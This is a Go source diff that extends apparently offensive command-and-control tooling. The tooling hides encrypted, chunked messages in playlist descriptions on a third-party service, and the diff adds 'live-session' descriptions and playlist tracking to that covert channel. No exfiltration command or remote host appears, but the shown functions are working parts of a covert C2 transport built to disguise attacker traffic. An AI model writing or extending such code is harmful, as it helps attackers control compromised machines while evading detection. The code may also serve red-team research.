@@ -171,9 +171,52 @@ func ReassemblePayload(chunkMetas []ChunkMeta) string {
 
 // ChunkMeta holds a chunk's data and its index for reassembly.
 type ChunkMeta struct {
-	Data  string
-	Meta  map[string]interface{}
-	Index int
+	Data       string
+	Meta       map[string]interface{}
+	Index      int
+	PlaylistID string // source playlist (empty when not applicable)
+}
+
+// IsLiveMeta reports whether a chunk meta map marks a live-session
+// playlist (edit-in-place transport). Live playlists are long-lived and
+// must never be deleted by read-side cleanup.
+func IsLiveMeta(meta map[string]interface{}) bool {
+	if meta == nil {
+		return false
+	}
+	v, ok := meta["live"]
+	if !ok {
+		return false
+	}
+	b, ok := v.(bool)
+	return ok && b
+}
+
+// LiveSessionDesc builds a single encrypted live-session description:
+// meta {"c": channel, "i": 1, "seq": seq, "live": true} wrapping data.
+// The data must fit in one chunk (<= shared.Proto.C2.EffectiveChunk).
+func LiveSessionDesc(channel string, seq int, data, encryptionKey string) (string, error) {
+	meta := map[string]interface{}{
+		"c":    channel,
+		"i":    1,
+		"seq":  seq,
+		"live": true,
+	}
+	return EncryptChunkDesc(meta, data, encryptionKey)
+}
+
+// ParseLiveSessionDesc decrypts a live-session description and returns
+// its seq and data. It fails if the description is not a live-session
+// description (missing "live": true in the meta).
+func ParseLiveSessionDesc(description, encryptionKey string) (seq int, data string, err error) {
+	meta, d, err := DecryptChunkDesc(description, encryptionKey)
+	if err != nil {
+		return 0, "", err
+	}
+	if !IsLiveMeta(meta) {
+		return 0, "", fmt.Errorf("not a live session description")
+	}
+	return getMetaInt(meta, "seq"), d, nil
 }
 
 // ReadC2Descriptions decrypts and filters C2 playlist descriptions.
@@ -210,9 +253,10 @@ func ReadC2Descriptions(descriptions []DescPair, encryptionKey string, channel s
 
 		idx := getMetaInt(meta, "i")
 		seqGroups[msgSeq] = append(seqGroups[msgSeq], ChunkMeta{
-			Data:  chunkData,
-			Meta:  meta,
-			Index: idx,
+			Data:       chunkData,
+			Meta:       meta,
+			Index:      idx,
+			PlaylistID: dp.PlaylistID,
 		})
 	}
 
